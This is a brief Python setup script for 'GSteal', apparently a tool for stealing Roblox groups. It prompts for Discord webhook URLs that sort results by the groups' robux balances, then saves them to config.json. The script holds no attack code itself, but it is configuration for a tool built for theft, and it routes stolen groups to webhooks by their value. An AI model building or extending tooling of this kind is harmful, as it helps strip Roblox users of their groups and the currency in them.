import json

print('''
GSteal Configuration - by cartridgevevo
''')

print('''
To share a group with all robux, put the same webhook in less then 10 robux andd more than 10 robux.
''')

url = str(input('Which Discord Webhook URL are you using for groups with less then 10 robux? : '))
url_failed = str(input('What Discord Webhook URL aree you using for groups with no Robux? : '))
url_10ormode = str(input('What Discord Webhook URL aree you using for groups with more than 10 robux? : '))
 
config = {
    'url': str(url),
    'url_failed': str(url_failed),
    'url_10ormode': str(url_10ormode) 
}
 
with open('config.json','w') as config_dumped :
    json.dump(config,config_dumped,indent = 4,sort_keys = True)